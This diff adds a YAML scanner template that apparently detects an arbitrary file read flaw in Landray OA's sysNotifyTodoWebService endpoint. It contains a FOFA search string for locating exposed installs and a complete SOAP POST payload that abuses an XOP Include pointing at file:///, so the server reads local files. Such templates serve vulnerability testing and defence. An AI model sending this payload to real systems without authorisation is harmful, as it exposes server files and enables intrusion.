@@ -1,0 +1,44 @@
+id: landray-oa-sysNotifyTodoWebService-fileread
+info:
+  name: Landray OA sysNotifyTodoWebService File Read
+  author: ZacharyZcR
+  severity: high
+  verified: true
+  description: |-
+    Landray OA System sysNotifyTodoWebService interface has an arbitrary file read vulnerability.
+    The vulnerability exists in the getTodoCount method which can be exploited to read arbitrary files on the system.
+    FOFA: body="Com_Parameter"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.md
+  tags: landray,lfi,fileread
+  created: 2024/12/30
+
+set:
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /sys/webservice/sysNotifyTodoWebService
+      headers:
+        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.notify.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getTodoCount>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></count>
+                </arg0>
+            </web:getTodoCount>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 500 &&  response.body.bcontains(b'Unmarshalling Error')
+expression: r0()
